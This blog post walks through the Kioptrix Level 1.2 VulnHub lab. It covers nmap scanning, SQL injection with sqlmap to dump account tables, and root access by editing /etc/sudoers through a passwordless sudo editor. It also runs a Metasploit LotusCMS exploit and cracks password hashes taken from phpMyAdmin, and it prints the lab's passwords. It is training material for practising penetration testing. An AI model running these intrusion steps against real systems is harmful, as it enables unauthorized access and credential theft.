<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Kioptrix Level-1.2 (Boot2Root Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-kioptrix-level-1-2-boot2root-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-07-23T06:29:38+00:00">July 23, 2016</time><time class="updated" datetime="2025-06-10T20:13:17+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as <strong>Kioptrix: Level1.2 (#3) </strong>and it is another boot2root challenge provided for practice and its security level is for the beginners. So let’s try to break through it. But before please note that you can download it from here <a style="color: #000000;" href="https://download.vulnhub.com/kioptrix/KVM3.rar">https://download.vulnhub.com/kioptrix/KVM3.rar</a></span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies (Method 1)</strong></span></p>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">Surfing HTTP service port (80)</span></li>
<li><span style="color: #000000;">SQLMAP Scanning</span></li>
<li><span style="color: #000000;">Extract databases and user credentials</span></li>
<li><span style="color: #000000;">SSH access to the target with a specific user</span></li>
<li><span style="color: #000000;">Exploiting target with SUID bit and SUDO binaries</span></li>
<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Penetrating Methodologies (Method 2)</strong></span></p>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">Surfing HTTP service port (80)</span></li>
<li><span style="color: #000000;">Identifying exploit for the vulnerable CMS application</span></li>
<li><span style="color: #000000;">Exploiting the target via Metasploit</span></li>
<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Lets Breach!</strong></span></p>
<p><span style="color: #000000;">Start off with finding the target using :</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3yYSdgZeNQw/W1Ar1S8_w9I/AAAAAAAAYV0/KhND3lPyMOgMIbO_qPY9Kb9MiPEUUxq9wCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Our target is <strong>192.168.1.101</strong> Now scan the target with nmap:</span></p>
<pre class="lang:default decode:true ">nmap -A 192.168.1.101</pre>
<p><span style="color: #000000;">With the nmap scan result, you can see that HTTP services are running on 2 ports i.e ports 22,80</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-dvcPh0bkrvU/W1Ar4Ke5fcI/AAAAAAAAYWk/1F09SKVAZn4bKqMC1hcv61Y7d61a09LHACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">As we have HTTP service running we opened it in our browser with the IP http://192.168.1.101. There is nothing significant on this webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ewPmdKxuNr4/W1Ar4SZGqTI/AAAAAAAAYWs/jZmN60rM2MsUJFQW_ZNbb0p-0hRyHuppwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Click on the Blog option and below page will appear. Here we will get a clue to check out the page</span></p>
<pre class="lang:default decode:true">http://kioptrix3.com/gallery</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v87m6CYIxVU/W1Ar4ziwVdI/AAAAAAAAYWw/GkRdtyEcyQokSPp3R6qsGgCsn4emdDyJACLcBGAs/s1600/4.1.png"/></span></p>
<p><span style="color: #000000;">Before navigating to the website, let’s map the host entries for the URL <strong>kioptrix3.com</strong> to IP 192.168.1.101 in the host’s file as follows :</span></p>
<p><span style="color: #000000;"><strong>For Windows </strong>C:\windows\system32\drivers\etc\hosts</span></p>
<p><span style="color: #000000;"><strong>For Linux: </strong>/etc/hosts</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-pZxYThRZH7U/W1Ar40xmQnI/AAAAAAAAYW0/JisCeLAK5SwboR8JM_q5JdN3uuRtljvUwCLcBGAs/s1600/4.png"/></strong></span></p>
<p><span style="color: #000000;"> Browse to the website  <a style="color: #000000;" href="http://kioptrix3.com/gallery">http://kioptrix3.com/gallery</a>  and navigate on a few items</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-w2Ic1ifntB8/W1Ar5fves3I/AAAAAAAAYW4/eZRCGUBcsAkV4XFdgNOAiv1PIOeCbYk7ACLcBGAs/s1600/5.png"/></strong></span></p>
<p><span style="color: #000000;">After navigating through the site, I found that by clicking on sorting options and photo id, the URL had a parameter of “id” which could signify a vulnerability to SQL injection. After putting ‘ after php?id=1 , i.e (by trying with http://kioptrix3.com/gallery/gallery.php?id=1’ ) the  SQL error prompt appears. Hence this means that URL is prone to SQL injection.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-b4VLAvwgC7c/W1Ar5UnUfCI/AAAAAAAAYW8/DnEXHSXVTxIxPggQL_Pgm6qcKsIRRQ_PQCLcBGAs/s1600/6.png"/></strong></span></p>
<p><span style="color: #000000;">Lets’ enumerate the databases with <strong>SQLMAP</strong> command to get more details</span></p>
<pre class="lang:default decode:true">sqlmap -u kioptrix3.com/gallery/gallery.php?id=1 --dbs –batch</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-e7WH058qHwY/W1Ar5mSd83I/AAAAAAAAYXA/7QeiSoszplsqVgeRGFrEZmO2qOv45VbmgCLcBGAs/s1600/7.1.png"/></strong></span></p>
<p><span style="color: #000000;">Upon successful completion of the SQLMAP scan, we came to know that the following databases listed are available on the website.</span></p>
<pre class="lang:default decode:true">sqlmap -u kioptrix3.com/gallery/gallery.php?id=1 -T dev_accounts --dump</pre>
<p><span style="color: #000000;">Upon further scan for the <strong>gallery</strong> database and specific table <strong>dev_accounts</strong>, we happen to find out 2 usernames as listed below</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-r7Ad-RKQ498/W1Ar6D_mxuI/AAAAAAAAYXE/YEcnw4-A2tIyfff6gtQWBYB3h-Jq88EvgCLcBGAs/s1600/7.png"/></strong></span></p>
<p><span style="color: #000000;"><strong> </strong>Perform SSH with the user <strong>loneferret</strong> as follows:</span></p>
<pre class="lang:default decode:true">ssh loneferret@192.168.1.101</pre>
<p><span style="color: #000000;">Let’s do the directory listing to find out more details</span></p>
<pre class="lang:default decode:true">ls</pre>
<p><span style="color: #000000;">Upon listing, we find that we have 2 files <strong>checksec.sh</strong> and CompanyPolicy.README. I didn’t find checksec.h file of much help and proceeded to extract the contents of CompanyPolicy.README</span></p>
<p><span style="color: #000000;"><strong>cat CompanyPolicy.README</strong></span></p>
<p><span style="color: #000000;">The output of the CompanyPolicy.README file reveals (refer screenshot below), that we may need to perform a sudo for the ht (editor). This may be a clue going forward</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-iAGmNanfwbo/W1Ar6GAonDI/AAAAAAAAYXI/CCTC3rquw8wyeOQ9jj7VYl2Wb9IjtSjLACLcBGAs/s1600/8.png"/></strong></span></p>
<p><span style="color: #000000;">At this moment, let’s also check the contents of the sudo file</span></p>
<pre class="lang:default decode:true">sudo –l</pre>
<p><span style="color: #000000;">As per the output, the user loneferret is allowed to run HT Editor as sudo and that there is no password (NOPASSWD) set for this user while executing the command <strong>/usr/local/bin/ht</strong></span></p>
<p><span style="color: #000000;"><strong>Run the HT Editor as sudo</strong></span></p>
<p><span style="color: #000000;"><strong>Note:</strong> <strong>sudo ht</strong> will allow editing any file on the system. Hence we will edit the /etc/sudoers file. Before editing the sudoers file make sure to export TERM so we can use graphical component of our command</span></p>
<pre class="lang:default decode:true">export TERM=xterm-color
sudo ht /etc/sudoers</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-TxZSL_H0KNs/W1Ar6cIrGyI/AAAAAAAAYXM/bUXbBvPov20f_F77AAITUH58gbCwdkQcQCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Once done, the HT editor will open up</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-gmddNhIwef4/W1Ar1hGwzOI/AAAAAAAAYV8/gHmpgL3VxsAAy_B8esYM9LNpe4W7q1LOQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Press F3 to open the file</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-rHGQ-hLBBfY/W1Ar1gwbduI/AAAAAAAAYV4/PjRJ2CFrmskwiN8k0WVOFfEczsq7yLGQwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Below is a snippet of /etc/sudoers file. Edit the file so that we can use sudo without limitations.</span></p>
<p><span style="color: #000000;">Refer the below entry in the file</span></p>
<pre class="lang:default decode:true">loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P7p5CvsBcmo/W1Ar2MYoPgI/AAAAAAAAYWA/Bxnkf_KdGDss2rzIpwjMmaOOsQc-xtuugCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now change the entry for the user loneferret as follows</span></p>
<pre class="lang:default decode:true">loneferret ALL=(ALL) NOPASSWD: ALL</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-glWlYP7REN4/W1Ar2m4OWYI/AAAAAAAAYWE/mK_WbIK7sSgkkuH9OzlFcSucZFqktyXrACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Upon changing the contents of the file, let’s run  sudo su command from the users’ terminal</span></p>
<pre class="lang:default decode:true">sudo su</pre>
<p><span style="color: #000000;">Hurrah! we have got the ROOT access !!<strong> </strong></span></p>
<pre class="lang:default decode:true">cd /root</pre>
<p><span style="color: #000000;">On performing the directory listing, we will get the <strong>congrats.txt</strong> file!</span></p>
<pre class="lang:default decode:true">ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-wzA_4slk2Kk/W1Ar2lJRq5I/AAAAAAAAYWI/upmpJ39R4p0Ggi33wy4tdMExGsIMWHVnwCLcBGAs/s1600/14.png"/></span></p>
<h3><span style="color: #800000;"><strong><u>Method 2 </u></strong></span></h3>
<p><span style="color: #000000;"><strong>Let’s explore another method of performing the same task </strong></span></p>
<pre class="lang:default decode:true">curl –v http://kioptrix3.com/</pre>
<p><span style="color: #000000;">The curl command will provide the details of the website. With this, we also came to know that it is a CMS website as highlighted below in yellow (LotusCMS)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8W-B9lvRbDQ/W1Ar2-XWlxI/AAAAAAAAYWM/4wMOJxngLWUEPVl7ug54Y-o9nm3cdfnwACLcBGAs/s1600/15.1.png"/></span></p>
<p><span style="color: #000000;">Now we will try to search for some exploit available in the Metasploit and fortunately we happen to found the exploit for LotusCMS</span></p>
<h3><span style="color: #800000;"><strong>searchsploit LotusCMS</strong></span></h3>
<p><span style="color: #000000;">To use this exploit simply type the following in Metasploit:</span></p>
<pre class="lang:default decode:true">use exploit/multi/http/lcms_php_exec
set rhost 192.168.1.101
set uri /
exploit</pre>
<p><span style="color: #000000;"><strong> </strong>Perform the directory listing and we will observe the gallery folder</span></p>
<pre class="lang:default decode:true ">ls</pre>
<p><span style="color: #000000;">Now navigate to the gallery folder and perform the directory listing. Here we can see many files.I browsed through many of these files; of which the file gconfig.php seems to be interesting.</span></p>
<pre class="lang:default decode:true">cd gallery
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-1VTD94JPOhM/W1Ar3Mgl4sI/AAAAAAAAYWQ/JdznZZTjT8sgNgeEPWj_Reuw8WIVs04iACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now let’s see if we can get some good information from the gconfig.php file</span></p>
<pre class="lang:default decode:true">cat gconfig.php</pre>
<p><span style="color: #000000;">The output of the file shows the credentials for the gallery database</span></p>
<pre class="lang:default decode:true">Username :root
Password : fuckeyou</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4fePb1Rvo1E/W1Ar3XZfT7I/AAAAAAAAYWU/kAVAHk0c42oLHJD4rXJ1W7ASz2bqlkGqwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Let’s perform dirb for the URL http://192.168.1.101/</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.101/</pre>
<p><span style="color: #000000;">With this, we will get information from many directories as shown in the output below. However, the directory <strong>phpmyadmin</strong> seems to be quite interesting, as it may have some important information to display  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--jQJBi_5LAo/W1Ar3oOevbI/AAAAAAAAYWY/X5vRmSZI0vQrStYtTtFMXFaKMDn2o9rGQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Browse the URL http://192.168.1.101/phpmyadmin and enter the credentials (received from above)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-NWLQTkgUU44/W1Ar3-x-t7I/AAAAAAAAYWc/lfbmxXMG5vAB4RSt9I_HDHbxVApzwz3gwCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Navigate to the gallery database, click on dev_accounts. Then click on the SQL tab and enter the SQL query below. We now have the usernames and password hashes!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Q6UYR9GmnHo/W1Ar37bm0YI/AAAAAAAAYWg/dZKaPPTCadsYOiGF3MWNmjargn3DUau4wCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">For cracking the password hashes, we used the <a style="color: #000000;" href="https://hashkiller.io/listmanager">http://www.hashkiller.co.uk/</a> site</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MnuqSHFN3X8/W1Ar4Xj5RbI/AAAAAAAAYWo/wrhG3c2wxJgzyW-dVryS8imiwMdJx-RfwCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Hurray! We got the passwords as <strong>starwars </strong>and <strong>Mast3r</strong>!</span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact <strong><a href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
